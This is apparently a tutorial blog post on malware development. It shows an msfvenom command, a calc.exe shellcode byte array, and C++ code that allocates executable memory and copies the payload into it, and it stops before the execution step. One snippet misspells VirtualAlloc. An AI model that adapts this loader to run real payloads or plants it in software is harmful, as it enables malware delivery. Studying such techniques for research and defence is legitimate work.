---
title: How to load and execute a shellcode in memory.
date: 2026-03-16 5:41 AM +0530
categories: [Malware development]
tags: ["Shellcode Injection"]
---

## Introduction

Hey everyone! In this blog, I will demonstrate how to load and execute shellcode in a Windows environment using a C++ program along with the Windows API. This article aims to provide a practical understanding of how shellcode execution works at a low level, how memory is allocated and managed within Windows processes, and how native API functions can be leveraged to run arbitrary code in memory. The goal is purely educational — to help readers understand core concepts.

This will be a basic demonstration of how shellcode is loaded and executed directly in memory. The technique shown here is intentionally simple and will typically be detected by several antivirus solutions, including the built-in Windows Defender. In upcoming blogs, I will further explore the underlying concepts and discuss more advanced techniques related to detection mechanisms and defensive evasion from an educational and research perspective.

Let’s begin by creating a simple shellcode that launches the Calculator application. For readers who are unfamiliar with shellcode, it is essentially low-level, position-independent code designed to execute without relying on a fixed memory address. Once the shellcode’s base address is assigned to a running thread, it can execute independently within the target process.


## Generating Shellcode

First, we need to generate a shellcode. For this demonstration, I will use **msfvenom** to create a simple payload using the following command:

```bash
msfvenom -p windows/x64/exec CMD="calc.exe" -f c
```
This command generates shellcode in a C-style variable format, allowing it to be directly copied and embedded into our program. Because the output is already formatted as a byte array, there is no need to load the shellcode from an external binary file — it can be included and executed directly within the source code.

```cpp
unsigned char buf[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
```

![Shellcode Generation with msfvenom](/assets/images/How-to-run-shellcode-in-memory/msfvenom_shellcode_gen.png)


## Loader Development
Now, let’s begin writing the actual C++ code. First, we will store the shellcode generated earlier using msfvenom as a variable, which will later be used to load the payload into memory for execution.

In this step, we also include the windows.h header file, which provides access to the Windows API functions required for memory allocation, process interaction, and execution management within the Windows environment.

```cpp
#include <iostream>
#include <Windows.h>

using namespace std;

int main() {
	unsigned char buf[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	return 0;
}
```


## Memory Allocation

```cpp
LPVOID baseaddr = VirutalAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

if(!baseaddr){
    cout << "Failed to Allocate Virtual Memory" << endl;
}
```
In this code snippet, we are asking Windows to allocate a block of virtual memory inside the current process. This memory will later be used to store our shellcode.

The `VirtualAlloc` function takes four arguments.

The first argument specifies the base memory address from where the allocation should begin. By passing `NULL`, we allow Windows to automatically choose a suitable memory location, so we do not need to worry about selecting an address manually.

The second argument specifies how much memory should be allocated. This depends on the size of our shellcode, which is why we use `sizeof(buf)` to allocate exactly the required amount of memory.

The third argument defines how the memory should be allocated. Here, we use two flags: `MEM_RESERVE | MEM_COMMIT`. where `MEM_RESERVE` reserves a range of virtual memory addresses for the process, but this memory is not yet mapped to physical memory, meaning it cannot be used immediately. To make the reserved memory usable, it must be mapped to physical memory, which is done using `MEM_COMMIT`. This flag commits the reserved memory and prepares it for actual use. The `|` (bitwise OR) operator combines both flags, instructing Windows to first reserve virtual memory based on the shellcode size and then map it to physical memory so the region becomes directly usable.

The fourth argument specifies the memory protection permissions, such as read, write, or execute access. Multiple permissions can be assigned at the same time. In this example, we use `PAGE_EXECUTE_READWRITE`, which allows the memory region to be readable, writable, and executable simultaneously. For example, if write permission is not provided, attempting to copy the shellcode into memory would result in an *Access Violation* error. Similarly, if execution permission is missing, the shellcode can be written successfully but will fail during execution with the same type of error.

Memory permissions can also be modified after allocation using the `VirtualProtect` function, which will be discussed in later blogs.

Finally, if `VirtualAlloc` successfully allocates memory, it returns the base address of the allocated region. This address can then be used to place and execute the shellcode, such as running it through a thread. If the allocation fails, the function returns `NULL`.


## Shellcode Injection

So far, we have successfully allocated a memory region for our shellcode with the required execution permissions. The next step is to copy the shellcode stored in the variable **`buf`** into this newly allocated memory.

To achieve this, we use the `memcpy` function — a standard C library function designed to copy raw memory from one location to another **byte-by-byte**.

```cpp
void *result = memcpy(baseaddr, buf, sizeof(buf));

if (!result) {
    cout << "Failed to copy memory" << endl;
}
```


The `memcpy` function takes three arguments.

First is the memory address where the data will be copied. In our case, this is the executable memory region returned earlier by `VirtualAlloc`.

Second is the address from which data will be copied. Here, `buf` contains our shellcode payload.

Third we have number of bytes to copy, Since we want to transfer the entire shellcode, we pass the total size of buf **sizeof(buf)**.

On successful execution, memcpy returns a pointer to the **destination buffer**, which in this case is `baseaddr`. This should match the same address returned by VirtualAlloc, allowing us to verify that the shellcode was copied to the correct memory location.

![memcpy result](/assets/images/How-to-run-shellcode-in-memory/memcpy_result.png)